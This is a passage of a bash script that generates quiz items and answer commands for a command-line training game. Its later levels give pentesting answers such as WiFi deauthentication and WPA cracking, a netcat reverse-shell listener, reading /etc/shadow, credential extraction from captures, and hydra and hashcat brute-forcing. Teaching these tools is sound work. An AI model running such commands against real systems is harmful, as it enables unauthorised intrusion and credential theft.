  questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
  questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
  questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
  questions+=("Copy all .${ext} files to ${dir}/|find . -name '*.${ext}' -exec cp {} ${dir}/ \\;|fd -e ${ext} -x cp {} ${dir}/")
  questions+=("Move all .${ext2} files to ${dir}/|find . -name '*.${ext2}' -exec mv {} ${dir}/ \\;|fd -e ${ext2} -x mv {} ${dir}/")
  questions+=("Change owner of all files in ${dir}/ to ${user}|find ${dir}/ -exec chown ${user}:${user} {} \\;")
  questions+=("Gzip all .${ext} files|find . -name '*.${ext}' -exec gzip {} \\;|fd -e ${ext} -x gzip {}")

  # Batch with + (more efficient)
  questions+=("List all .${ext} files in one ls call|find . -name '*.${ext}' -exec ls -l {} +")
  questions+=("Count total lines across all .${ext} files§find . -name '*.${ext}' -exec wc -l {} + | tail -1")
  questions+=("Cat all .${ext} files together|find . -name '*.${ext}' -exec cat {} +")

  # sed replacement
  questions+=("Replace '${old}' with '${new}' in ${cfg}|sed -i 's/${old}/${new}/g' ${cfg}|sd '${old}' '${new}' ${cfg}")
  questions+=("Delete lines containing '${term}' in ${log}|sed -i '/${term}/d' ${log}")
  questions+=("Delete empty lines from ${txt}|sed -i '/^$/d' ${txt}")
  questions+=("Delete lines ${linenum} to $((linenum + n)) from ${txt}|sed -i '${linenum},$((linenum + n))d' ${txt}")
  questions+=("Add prefix 'LOG: ' to each line in ${W}${log}${C}|sed -i 's/^/LOG: /' ${log}")
  questions+=("Add suffix '.bak' to each line in ${W}${txt}${C}|sed -i 's/\$/.bak/' ${txt}")
  questions+=("Replace '${old}' in all .${ext} files|find . -name '*.${ext}' -exec sed -i 's/${old}/${new}/g' {} \\;|fd -e ${ext} -x sd '${old}' '${new}' {}")
  questions+=("Print only lines matching '${term}' in ${W}${log}${C}|sed -n '/${term}/p' ${log}")

  # xargs - building commands from stdin
  questions+=("Delete files listed in filelist.txt|xargs rm < filelist.txt")
  questions+=("Grep in found files (safe with spaces)§find . -name '*.${ext}' -print0 | xargs -0 grep ${term}")
  questions+=("Count lines in found files (safe with spaces)§find . -name '*.${ext}' -print0 | xargs -0 wc -l")
  questions+=("Grep in parallel (${parallel} jobs)§find . -name '*.${ext}' -print0 | xargs -0 -P ${parallel} grep ${term}")
  questions+=("Confirm before each delete (interactive)§find . -name '*.${ext2}' -print0 | xargs -0 -p rm")
  questions+=("Copy files in batches of ${n}§find . -name '*.${ext}' -print0 | xargs -0 -n ${n} cp -t ${dir}/")
  questions+=("Rename files with backup_ prefix§find . -maxdepth 1 -name '*.${ext}' -printf '%f\\n' | xargs -I {} mv {} backup_{}")
  questions+=("Preview what xargs would run (verbose/trace mode)§find . -name '*.${ext}' -print0 | xargs -0 -t wc -l")

  # Combined operations
  questions+=("Find .${ext} files > ${size}, show sizes sorted§find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
  questions+=("Replace and backup: ${old} -> ${new}, keep .bak in ${W}${cfg}${C}|sed -i.bak 's/${old}/${new}/g' ${cfg}")
  questions+=("Find and replace recursively in ${dir}/|find ${dir}/ -type f -exec sed -i 's/${old}/${new}/g' {} \\;")

  # Systemd service management - L19-only commands (basics covered in L12)
  questions+=("Reload ${svc} config without restart|systemctl reload ${svc}|sudo systemctl reload ${svc}")
  questions+=("Check if ${svc} is enabled|systemctl is-enabled ${svc}")
  questions+=("Check if ${svc} is active|systemctl is-active ${svc}")
  questions+=("Show ${svc} unit file|systemctl cat ${svc}")
  questions+=("Edit ${svc} unit file override|systemctl edit ${svc}|sudo systemctl edit ${svc}")
  questions+=("Mask ${svc} (prevent starting)|systemctl mask ${svc}|sudo systemctl mask ${svc}")
  questions+=("Unmask ${svc}|systemctl unmask ${svc}|sudo systemctl unmask ${svc}")

  # Journalctl - L19-only commands (basics covered in L12)
  questions+=("View last ${n2} log lines for ${svc}|journalctl -u ${svc} -n ${n2}")
  questions+=("View kernel messages|journalctl -k|dmesg")
  questions+=("View logs from last hour|journalctl --since '1 hour ago'")
  questions+=("View logs from last ${n} minutes|journalctl --since '${n} minutes ago'")
  questions+=("View errors only|journalctl -p err|journalctl -p 3")
  questions+=("Disk usage of journal|journalctl --disk-usage")
  local jsize=${size/k/K}
  questions+=("Vacuum journal to ${jsize}|journalctl --vacuum-size=${jsize}|sudo journalctl --vacuum-size=${jsize}")
  questions+=("Output as JSON|journalctl -u ${svc} -o json")

  # Cron / crontab - scheduling
  questions+=("Edit your crontab|crontab -e")
  questions+=("List your cron jobs|crontab -l")
  questions+=("Remove all your cron jobs|crontab -r")
  questions+=("Edit root's crontab|sudo crontab -e")
  local cron_path="/usr/local/bin/${script}"
  questions+=("Run ${script} every 5 minutes|*/5 * * * * ${cron_path}")
  questions+=("Run ${script} at midnight daily|0 0 * * * ${cron_path}")
  questions+=("Run ${script} every Monday at 3am|0 3 * * 1 ${cron_path}")
  questions+=("Run ${script} on the 1st of each month|0 0 1 * * ${cron_path}")
  questions+=("Run ${script} every hour|0 * * * * ${cron_path}|@hourly ${cron_path}")
  questions+=("Run ${script} at reboot|@reboot ${cron_path}")
  questions+=("Cron: redirect output to log§*/5 * * * * ${cron_path} >> /var/log/${script%.sh}.log 2>&1")
  questions+=("Cron: silence all output§0 * * * * ${cron_path} > /dev/null 2>&1")

  # === COMPOUND: Uses grep (L14), pipes (L3), logic (L6), find (L15) ===
  questions+=("Replace '${old}' in all .${ext} files, confirm changes§find . -name '*.${ext}' -exec grep -l ${old} {} \\; | xargs sed -i 's/${old}/${new}/g'")
  questions+=("Find .${ext} files > ${size}, print and delete§find . -name '*.${ext}' -size +${size} -print -delete")
  questions+=("Check ${svc} status, restart if not active§systemctl is-active ${svc} || systemctl restart ${svc}")
  questions+=("View ${svc} errors, count unique messages§journalctl -u ${svc} -p err --no-pager | sort | uniq -c | sort -rn")
  questions+=("Find and grep all logs modified today§find /var/log -mtime 0 -type f -exec grep -l ${term} {} \\;")

  printf '%s\n' "${questions[@]}"
}

# Level 22: Advanced Regex
gen_level22() {
  eval "local questions=() $_QV"; _ctx

  # Regex lookahead/lookbehind (grep -P for PCRE)
  questions+=("Match 'error' followed by number in ${W}${log}${C}|grep -P 'error(?=\\d)' ${log}")
  questions+=("Match 'error' NOT followed by number in ${W}${log}${C}|grep -P 'error(?!\\d)' ${log}")
  questions+=("Match number preceded by '$' in ${W}${log}${C}|grep -P '(?<=\\$)\\d+' ${log}")
  questions+=("Match number NOT preceded by '$' in ${W}${log}${C}|grep -P '(?<!\\$)\\d+' ${log}")

  # Non-greedy matching
  questions+=("Non-greedy match between quotes in ${W}${log}${C}|grep -oP '\".*?\"' ${log}")
  questions+=("Match shortest HTML tag in ${W}${txt}${C}|grep -oP '<.*?>' ${txt}")
  questions+=("Extract first word after colon in ${W}${log}${C}|grep -oP ':\\s*\\K\\S+' ${log}")

  # Word boundaries and anchors
  questions+=("Match whole word 'error' only in ${W}${log}${C}|grep -w 'error' ${log}|grep -P '\\berror\\b' ${log}")
  questions+=("Match 'error' at word boundary in ${W}${log}${C}|grep -P '\\berror' ${log}")
  questions+=("Match lines starting with digit in ${W}${txt}${C}|grep '^[0-9]' ${txt}")
  questions+=("Match lines ending with digit in ${W}${txt}${C}|grep '[0-9]$' ${txt}")
  questions+=("Match empty lines in ${W}${txt}${C}|grep '^$' ${txt}")

  # Character classes
  questions+=("Match any vowel in ${W}${txt}${C}|grep '[aeiou]' ${txt}")
  questions+=("Match non-digit in ${W}${txt}${C}|grep '[^0-9]' ${txt}")
  questions+=("Match word character in ${W}${txt}${C}|grep -P '\\w' ${txt}")
  questions+=("Match whitespace in ${W}${txt}${C}|grep -P '\\s' ${txt}")
  questions+=("Match hex character in ${W}${txt}${C}|grep '[0-9a-fA-F]' ${txt}")

  # Quantifiers
  questions+=("Match exactly ${n} digits in ${W}${log}${C}|grep -E '[0-9]{${n}}' ${log}")
  questions+=("Match ${n} or more digits in ${W}${log}${C}|grep -E '[0-9]{${n},}' ${log}")
  questions+=("Match 2 to ${n} digits in ${W}${log}${C}|grep -E '[0-9]{2,${n}}' ${log}")
  questions+=("Match optional 's' (plurals) in ${W}${log}${C}|grep -E 'errors?' ${log}")

  # Groups and backreferences
  questions+=("Match repeated word in ${W}${txt}${C}|grep -P '\\b(\\w+)\\s+\\1\\b' ${txt}")
  questions+=("Match repeated character in ${W}${txt}${C}|grep -E '(.)\\1' ${txt}")
  questions+=("Capture and replace with sed in ${W}${log}${C}|sed -E 's/(error):\\s*(.*)/\\2 [\\1]/' ${log}")
  questions+=("Swap two words in ${W}${txt}${C}|sed -E 's/(\\w+)\\s+(\\w+)/\\2 \\1/' ${txt}")

  # Advanced sed
  questions+=("Delete lines matching pattern in ${W}${txt}${C}|sed '/pattern/d' ${txt}")
  questions+=("Print only lines matching in ${W}${txt}${C}|sed -n '/pattern/p' ${txt}")
  questions+=("Replace only on lines matching in ${W}${log}${C}|sed '/error/s/foo/bar/g' ${log}")
  questions+=("Insert line before match in ${W}${txt}${C}|sed '/pattern/i inserted line' ${txt}")
  questions+=("Insert line after match in ${W}${txt}${C}|sed '/pattern/a inserted line' ${txt}")
  questions+=("Change entire matching line in ${W}${txt}${C}|sed '/pattern/c replacement line' ${txt}")
  questions+=("Multiple sed commands in ${W}${txt}${C}|sed -e 's/a/b/' -e 's/c/d/' ${txt}")
  questions+=("Sed with address range in ${W}${txt}${C}|sed '5,10s/old/new/g' ${txt}")
  questions+=("Delete from line 5 to pattern in ${W}${txt}${C}|sed '5,/pattern/d' ${txt}")
  questions+=("Transform case (lowercase) in ${W}${txt}${C}|sed 's/.*/\\L&/' ${txt}")
  questions+=("Transform case (uppercase) in ${W}${txt}${C}|sed 's/.*/\\U&/' ${txt}")
  questions+=("Capitalize first letter in ${W}${txt}${C}|sed 's/.*/\\u&/' ${txt}")

  # Advanced awk
  questions+=("Print lines where id > value in ${W}data.csv${C}|awk -F',' '\$1 > 100' data.csv")
  questions+=("Print unique values from column in ${W}${csv}${C}|awk -F',' '!seen[\$1]++' ${csv}")
  questions+=("Sum id column in ${W}data.csv${C} (skip header)|awk -F',' 'NR>1{sum+=\$1} END{print sum}' data.csv")
  questions+=("Average of id column in ${W}data.csv${C} (skip header)|awk -F',' 'NR>1{sum+=\$1; n++} END{print sum/n}' data.csv")
  questions+=("Find max id (skip header) in ${W}data.csv${C}|awk -F',' 'NR==2{max=\$1} NR>1 && \$1>max{max=\$1} END{print max}' data.csv")
  questions+=("Find min id (skip header) in ${W}data.csv${C}|awk -F',' 'NR==2{min=\$1} NR>1 && \$1<min{min=\$1} END{print min}' data.csv")
  questions+=("Group by and count in ${W}${csv}${C}|awk -F',' '{count[\$1]++} END{for(k in count) print k, count[k]}' ${csv}")
  questions+=("Conditional print in ${W}${csv}${C}|awk -F',' '\$3==\"active\" {print \$1, \$2}' ${csv}")
  questions+=("Print with custom separator in ${W}${csv}${C}§awk -F',' 'BEGIN{OFS=\"|\"} {print \$1,\$2}' ${csv}")
  questions+=("String functions: length in ${W}${txt}${C}|awk '{print length(\$0)}' ${txt}")
  questions+=("String functions: substr in ${W}${txt}${C}|awk '{print substr(\$0,1,10)}' ${txt}")
  questions+=("String functions: gsub in ${W}${txt}${C}|awk '{gsub(/old/,\"new\"); print}' ${txt}")
  questions+=("String functions: split in ${W}${txt}${C}|awk '{n=split(\$0,a,\":\"); print a[1]}' ${txt}")
  questions+=("Pattern range in ${W}${txt}${C}|awk '/start/,/end/' ${txt}")
  questions+=("Print line numbers in ${W}${txt}${C}|awk '{print NR\": \"\$0}' ${txt}")
  questions+=("Skip header line in ${W}${csv}${C}|awk 'NR>1' ${csv}")
  questions+=("Print every nth line in ${W}${txt}${C}|awk 'NR%${n}==0' ${txt}")
  questions+=("Reverse fields in ${W}${txt}${C}|awk '{for(i=NF;i>0;i--) printf \"%s \",\$i; print \"\"}' ${txt}")

  # Combining tools
  questions+=("Complex: extract, sort, count in ${W}${log}${C}§grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
  questions+=("Complex: top N by frequency in ${W}${log}${C}§awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
  questions+=("Complex: join lines with comma in ${W}${txt}${C}|paste -sd',' ${txt}")

  # Process substitution - advanced piping
  questions+=("Diff sorted contents of ${txt} and ${txt2}|diff <(sort ${txt}) <(sort ${txt2})")
  questions+=("Compare output of two commands|diff <(cmd1) <(cmd2)")
  questions+=("Feed ${W}${log}${C} as input to program (process substitution)|wc -l <(grep pattern ${log})")

  printf '%s\n' "${questions[@]}"
}

# Level 23: Git
gen_level23() {
  eval "local questions=() $_QV"; _ctx

  # Basics
  questions+=("Initialize new git repo|git init")
  questions+=("Clone repo from URL|git clone https://github.com/user/repo.git")
  questions+=("Clone repo to specific dir|git clone https://github.com/user/repo.git mydir")
  questions+=("Check repo status|git status")
  questions+=("Show current branch|git branch --show-current|git rev-parse --abbrev-ref HEAD")

  # Staging & committing
  questions+=("Stage file '${txt}' for commit|git add ${txt}")
  questions+=("Stage all tracked changed files|git add -u")
  questions+=("Stage all files including untracked|git add -A|git add --all")
  questions+=("Stage interactively (hunks)|git add -p|git add --patch")
  questions+=("Commit with message|git commit -m \"message\"")
  questions+=("Commit all tracked changes|git commit -am \"message\"|git commit -a -m \"message\"")
  questions+=("Amend last commit message|git commit --amend -m \"new message\"")
  questions+=("Amend last commit (add files)|git commit --amend --no-edit")

  # Branches
  questions+=("List all branches|git branch -a|git branch --all")
  questions+=("Create new branch '${branch}'|git branch ${branch}")
  questions+=("Switch to branch '${branch}'|git checkout ${branch}|git switch ${branch}")
  questions+=("Create and switch to new branch '${branch}'|git checkout -b ${branch}|git switch -c ${branch}")
  questions+=("Delete local branch '${branch}'|git branch -d ${branch}")
  questions+=("Force delete local branch '${branch}'|git branch -D ${branch}")
  questions+=("Delete remote branch '${branch}'|git push origin --delete ${branch}")
  questions+=("Rename current branch|git branch -m newname")

  # Remote operations
  questions+=("Add remote origin|git remote add origin https://github.com/user/repo.git")
  questions+=("List remotes|git remote -v")
  questions+=("Fetch from remote|git fetch origin")
  questions+=("Pull branch '${branch}' from remote|git pull origin ${branch}")
  questions+=("Push branch '${branch}' to remote|git push origin ${branch}")
  questions+=("Push and set upstream|git push -u origin ${branch}|git push --set-upstream origin ${branch}")
  questions+=("Force push (dangerous)|git push --force origin ${branch}|git push -f origin ${branch}")
  questions+=("Force push safely (fail if remote changed)|git push --force-with-lease origin ${branch}")

  # History & diff
  questions+=("Show commit log|git log")
  questions+=("Show log one line per commit|git log --oneline")
  questions+=("Show log with graph|git log --oneline --graph --all")
  questions+=("Show last ${n} commits|git log -${n}|git log -n ${n}")
  questions+=("Show diff of unstaged changes|git diff")
  questions+=("Show diff of staged changes|git diff --staged|git diff --cached")
  questions+=("Show diff between branches|git diff main..${branch}|git diff main ${branch}")
  questions+=("Show who changed each line in ${W}${txt}${C}|git blame ${txt}")
  questions+=("Search commits for string|git log -S \"searchterm\"")
  questions+=("Show ${W}${txt}${C} at specific commit|git show HEAD~${n}:${txt}")

  # Undoing
  questions+=("Unstage file '${txt}'|git reset HEAD ${txt}|git restore --staged ${txt}")
  questions+=("Discard changes to file '${txt}'|git checkout -- ${txt}|git restore ${txt}")
  questions+=("Reset to last commit (keep changes)|git reset --soft HEAD~1")
  questions+=("Reset to last commit (discard changes)|git reset --hard HEAD~1")
  questions+=("Revert a commit (new commit)|git revert HEAD")
  questions+=("Stash changes|git stash")
  questions+=("Stash with message|git stash push -m \"message\"")
  questions+=("Apply latest stash|git stash pop")
  questions+=("List stashes|git stash list")
  questions+=("Apply specific stash|git stash apply stash@{${n}}")

  # Merging & rebasing
  questions+=("Merge branch '${branch}' into current|git merge ${branch}")
  questions+=("Rebase current onto main|git rebase main")
  questions+=("Continue rebase after conflict|git rebase --continue")
  questions+=("Abort rebase|git rebase --abort")
  questions+=("Cherry-pick commit|git cherry-pick abc123")
  questions+=("Squash last ${n} commits|git rebase -i HEAD~${n}")

  # Tags
  questions+=("List tags|git tag")
  questions+=("Create lightweight tag|git tag v1.0.0")
  questions+=("Create annotated tag|git tag -a v1.0.0 -m \"Release 1.0\"")
  questions+=("Push tags to remote|git push --tags")
  questions+=("Delete tag|git tag -d v1.0.0")

  # Config
  questions+=("Set user name globally|git config --global user.name \"Name\"")
  questions+=("Set user email globally|git config --global user.email \"email@example.com\"")
  questions+=("List all config|git config --list")
  questions+=("Set default branch name|git config --global init.defaultBranch main")

  # Advanced
  questions+=("Find commit that introduced bug|git bisect start; git bisect bad; git bisect good abc123")
  questions+=("Clean untracked files (dry run)|git clean -n")
  questions+=("Clean untracked files|git clean -f")
  questions+=("Clean untracked files and dirs|git clean -fd")
  questions+=("Show reflog|git reflog")
  questions+=("Recover deleted branch from reflog|git checkout -b recovered abc123")

  printf '%s\n' "${questions[@]}"
}

# Level 24: Network Tools
gen_level24() {
  eval "local questions=() $_QV"; _ctx
  local key=data  # export.json only has .data array

  # tshark - packet capture & analysis
  questions+=("Capture traffic on ${iface} to ${pcap}|tshark -i ${iface} -w ${pcap}")
  questions+=("Capture only 100 packets to ${W}${pcap}${C}|tshark -i ${iface} -c 100 -w ${pcap}")
  questions+=("Read and display ${pcap}|tshark -r ${pcap}")
  questions+=("Filter HTTP traffic from ${pcap}|tshark -r ${pcap} -Y http")
  questions+=("Filter traffic to/from ${ip} in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'ip.addr == ${ip}'")
  questions+=("Show DNS queries in ${W}${pcap}${C}|tshark -r ${pcap} -Y dns|tshark -r ${pcap} -Y 'dns.qry.name'")
  questions+=("Extract HTTP POST data in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'http.request.method == POST' -T fields -e http.file_data")
  questions+=("Extract all URLs from ${W}${pcap}${C}|tshark -r ${pcap} -Y 'http.request' -T fields -e http.host -e http.request.uri")
  questions+=("Show TCP conversations in ${W}${pcap}${C}|tshark -r ${pcap} -q -z conv,tcp")
  questions+=("Extract credentials (FTP, HTTP basic) in ${W}${pcap}${C}§tshark -r ${pcap} -Y 'ftp.request.command == PASS || http.authbasic'")

  # jq - JSON processing
  questions+=("Pretty print JSON file|jq '.' data/export.json")
  questions+=("Extract '${key}' array from JSON|jq '.${key}' data/export.json")
  questions+=("Extract first item from '${key}' array|jq '.${key}[0]' data/export.json")
  questions+=("Extract 'name' field from each item§jq '.${key}[] | .name' data/export.json")
  questions+=("Filter items where status is 'active'§jq '.${key}[] | select(.status == \"active\")' data/export.json")
  questions+=("Count items in array§jq '.${key} | length' data/export.json")
  questions+=("Get keys of JSON object|jq 'keys' data/export.json")
  questions+=("Compact JSON (remove whitespace)|jq -c '.' data/export.json")
  questions+=("Create new object from fields§jq '.${key}[] | {name: .name, id: .id}' data/export.json")
  questions+=("Fetch ${url}/api and extract '${key}' array with ${Y}jq${C}§curl -s ${url}/api | jq '.${key}'")

  # curl - HTTP client
  questions+=("GET request to ${url}|curl ${url}")
  questions+=("GET request with headers shown|curl -i ${url}")
  questions+=("POST JSON data|curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' ${url}/api")
  questions+=("POST form data|curl -X POST -d 'user=admin&pass=test' ${url}/login")
  questions+=("Follow redirects|curl -L ${url}")
  questions+=("Save output to file|curl -o output.html ${url}")
  questions+=("Send with custom header|curl -H 'Authorization: Bearer token123' ${url}/api")
  questions+=("Silent mode (no progress)|curl -s ${url}")
  questions+=("Download file with original name|curl -O ${url}/file.tar.gz")

  # SSH tunneling (CRITICAL for pentesting)
  questions+=("SSH local port forward: access remote ${port} via local 8080|ssh -L 8080:localhost:${port} ${user}@${host}")
  questions+=("SSH remote port forward: expose local ${port} on remote|ssh -R ${port}:localhost:${port} ${user}@${host}")
  questions+=("SSH dynamic SOCKS proxy on port 1080|ssh -D 1080 ${user}@${host}")
  questions+=("SSH through jump host to target|ssh -J ${user}@jump ${user}@target")
  questions+=("SSH tunnel in background|ssh -fN -L 8080:localhost:80 ${user}@${host}")
  questions+=("SSH execute remote command|ssh ${user}@${host} 'ls -la'")
  questions+=("SCP file to remote|scp file.txt ${user}@${host}:/tmp/")
  questions+=("Rsync with progress|rsync -avz --progress file.txt ${user}@${host}:/backup/")

  # wget
  questions+=("Download file|wget ${url}/file.tar.gz")
  questions+=("Continue interrupted download|wget -c ${url}/large.iso")
  questions+=("Mirror website for offline|wget -mk ${url}")

  # OpenSSL (cert checking, encryption)
  questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
  questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -pbkdf2 -salt -in file.txt -out file.enc")
  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt")
  questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")

  # SMB/NetBIOS
  questions+=("List SMB shares anonymously on ${ip}|smbclient -L //${ip} -N")
  questions+=("Connect to SMB share|smbclient //${ip}/share -U ${user}")
  questions+=("Enumerate SMB with enum4linux|enum4linux -a ${ip}")

  printf '%s\n' "${questions[@]}"
}

# Level 25: Network Scanning (nmap)
gen_level25() {
  eval "local questions=() $_QV"; _ctx
  local port2=$((port + 1000))

  # Basic scans
  questions+=("Scan all 65535 ports on ${ip}|nmap -p- ${ip}")
  questions+=("Scan top 100 most common ports on ${ip}|nmap --top-ports 100 ${ip}")
  questions+=("Scan specific ports ${port},${port2} on ${ip}|nmap -p ${port},${port2} ${ip}")
  questions+=("Scan port range 1-1000 on ${ip}|nmap -p 1-1000 ${ip}")
  questions+=("Fast scan (top 100 ports) on ${ip}|nmap -F ${ip}")

  # Service/version detection
  questions+=("Detect service versions (banner grab) on ${ip}|nmap -sV ${ip}")
  questions+=("OS fingerprinting via TCP/IP stack on ${ip}|nmap -O ${ip}")
  questions+=("Aggressive scan (-A = OS, version, scripts, traceroute)|nmap -A ${ip}")
  questions+=("Run default NSE scripts (-sC) on ${ip}|nmap -sC ${ip}")
  questions+=("Combined recon: version + scripts on ${ip}|nmap -sV -sC ${ip}")

  # Scan types
  questions+=("UDP scan top 20 ports on ${ip}|nmap -sU --top-ports 20 ${ip}")
  questions+=("TCP connect scan on ${ip} (full handshake)|nmap -sT ${ip}")
  questions+=("TCP SYN scan on ${ip} (half-open)|nmap -sS ${ip}")
  questions+=("Scan ${ip}, skip host discovery (treat as up)|nmap -Pn ${ip}")

  # Network discovery
  questions+=("Ping sweep ${subnet} (find live hosts)|nmap -sn ${subnet}")
  questions+=("List targets in ${subnet} without scanning|nmap -sL ${subnet}")
  questions+=("ARP scan local network ${subnet}|nmap -PR -sn ${subnet}")

  # Output formats
  questions+=("Scan ${ip}, save all formats to 'scan' prefix|nmap -oA scan ${ip}")
  questions+=("Scan ${ip}, save greppable output to scan.gnmap|nmap -oG scan.gnmap ${ip}")

  # Scripts
  questions+=("Run vulnerability scripts on ${ip}|nmap --script vuln ${ip}")
  questions+=("Banner grab port ${port} on ${ip}|nmap -sV -p ${port} --script banner ${ip}")
  questions+=("Enumerate SMB shares on ${ip}|nmap --script smb-enum-shares ${ip}")
  questions+=("Enumerate HTTP methods on ${ip}|nmap --script http-methods -p 80,443 ${ip}")
  questions+=("Check for anonymous FTP on ${ip}|nmap --script ftp-anon -p 21 ${ip}")

  # Speed and stealth
  questions+=("Slow scan ${ip} (evade IDS)|nmap -T1 ${ip}")
  questions+=("Aggressive timing scan ${ip} (faster)|nmap -T4 ${ip}")

  # Combined
  questions+=("Full scan: all ports, version, scripts, all outputs|nmap -p- -sV -sC -oA full ${ip}")

  printf '%s\n' "${questions[@]}"
}

# Level 26: WiFi & RF
gen_level26() {
  eval "local questions=() $_QV"; _ctx
  _fpick WIFI_INTERFACES; local wiface=$REPLY

  # WiFi attacks
  questions+=("Enable monitor mode on ${wiface}|airmon-ng start ${wiface}")
  questions+=("Scan for WiFi networks|airodump-ng ${wiface}mon")
  questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${wiface}mon")
  questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${wiface}mon")
  questions+=("Crack WPA handshake using ${W}${wordlist}${C}|aircrack-ng -w ${wordlist} capture-01.cap")

  # Netcat
  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
  questions+=("Connect to remote port|nc ${ip} ${port}")
  questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
  questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")

  # Mass scanning
  questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
  questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")

  # Packet capture
  questions+=("Capture packets on ${iface}|tcpdump -i ${iface}")
  questions+=("Capture and save to ${W}${pcap}${C}|tcpdump -i ${iface} -w ${pcap}")
  questions+=("Read saved ${W}${pcap}${C}|tcpdump -r ${pcap}")
  questions+=("Capture only port ${port} traffic|tcpdump -i ${iface} port ${port}")
  questions+=("Capture only traffic to/from ${ip}|tcpdump -i ${iface} host ${ip}")
  questions+=("Capture first ${n} packets|tcpdump -i ${iface} -c ${n}")
  questions+=("Capture with verbose output|tcpdump -i ${iface} -vvv")
  questions+=("Capture DNS traffic only|tcpdump -i ${iface} port 53")
  questions+=("Capture HTTP traffic only|tcpdump -i ${iface} port 80")
  questions+=("Don't resolve hostnames in capture|tcpdump -i ${iface} -n")

  # Wireless recon
  questions+=("Show wireless interfaces|iw dev")
  questions+=("Scan for nearby APs|iw dev ${wiface} scan|iwlist ${wiface} scan")
  questions+=("Show connected WiFi info|iw dev ${wiface} link")
  questions+=("Set WiFi channel to 6|iw dev ${wiface}mon set channel 6")
  questions+=("Disable monitor mode|airmon-ng stop ${wiface}mon")

  printf '%s\n' "${questions[@]}"
}

# Level 27: Hash Cracking
gen_level27() {
  eval "local questions=() $_QV"; _ctx
  local hidx=$((RANDOM % ${#HASHCAT_MODES[@]}))
  local hmode=${HASHCAT_MODES[$hidx]} hname=${HASH_NAMES[$hidx]}

  # Hashcat dictionary attacks
  questions+=("Dictionary attack on MD5 (-m 0) hashes in ${hash} using ${W}${wordlist}${C}|hashcat -m 0 ${hash} ${wordlist}")
  questions+=("Dictionary attack on ${hname} (-m ${hmode}) hashes using ${W}${wordlist}${C}|hashcat -m ${hmode} ${hash} ${wordlist}")
  questions+=("Crack Windows NTLM hashes (-m 1000) in ${hash} using ${W}${wordlist}${C}|hashcat -m 1000 ${hash} ${wordlist}")

  # Hashcat brute force
  questions+=("Brute force 4-digit PIN (MD5)|hashcat -m 0 -a 3 ${hash} ?d?d?d?d")
  questions+=("Mask attack: Capital + 5 lower + 2 digits|hashcat -m 0 -a 3 ${hash} ?u?l?l?l?l?l?d?d")

  # Hashcat rules & session
  questions+=("Crack ${hash} with rules using ${W}${wordlist}${C}|hashcat -m 0 -r rules/best64.rule ${hash} ${wordlist}")
  questions+=("Show already cracked from ${hash}|hashcat -m 0 ${hash} --show")
  questions+=("Resume interrupted hashcat session|hashcat --restore")

  # John the Ripper
  questions+=("Crack ${hash} with john (auto-detect format)|john ${hash}")
  questions+=("Crack ${hash} with john using ${wordlist}|john --wordlist=${wordlist} ${hash}")
  questions+=("Show cracked passwords from john|john --show ${hash}")
  questions+=("List supported john formats|john --list=formats")

  # John hash extraction (FIXED - was incorrect before)
  questions+=("Extract hash from encrypted ZIP file|zip2john archive.zip > hash.txt")
  questions+=("Extract hash from encrypted PDF|pdf2john document.pdf > hash.txt")
  questions+=("Extract hash from encrypted RAR|rar2john archive.rar > hash.txt")
  questions+=("Extract hash from /etc/shadow format|unshadow /etc/passwd /etc/shadow > hash.txt")

  # Hydra
  questions+=("Brute force SSH login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ssh")
  questions+=("Brute force FTP login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ftp")
  questions+=("Brute force HTTP basic auth on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-get /")
  questions+=("Brute force HTTP POST login form using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
  questions+=("Brute force with ${W}${wordlist}${C} and username list|hydra -L users.txt -P ${wordlist} ${ip} ssh")
  questions+=("Brute force with ${W}${wordlist}${C}, limit to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")

  # Encoding/decoding
  questions+=("Encode string 'secret' to base64§echo -n 'secret' | base64")
  questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
  questions+=("Generate MD5 hash of string 'password'§echo -n 'password' | md5sum")
  questions+=("Generate SHA256 hash of string 'password'§echo -n 'password' | sha256sum")
  questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")

  # Hex operations
  questions+=("Convert 'hello' to hex§echo -n 'hello' | xxd -p")
  questions+=("Convert hex back to ascii§echo '68656c6c6f' | xxd -r -p")
  questions+=("Hex dump ${W}${bin}${C} with addresses|xxd ${bin}")
  questions+=("Hex dump ${W}${bin}${C} (no addresses)|xxd -p ${bin}")

  printf '%s\n' "${questions[@]}"
}

# Level 28: Forensics
gen_level28() {
  eval "local questions=() $_QV"; _ctx

  # String extraction
  questions+=("Extract ASCII strings from ${bin}|strings ${bin}")
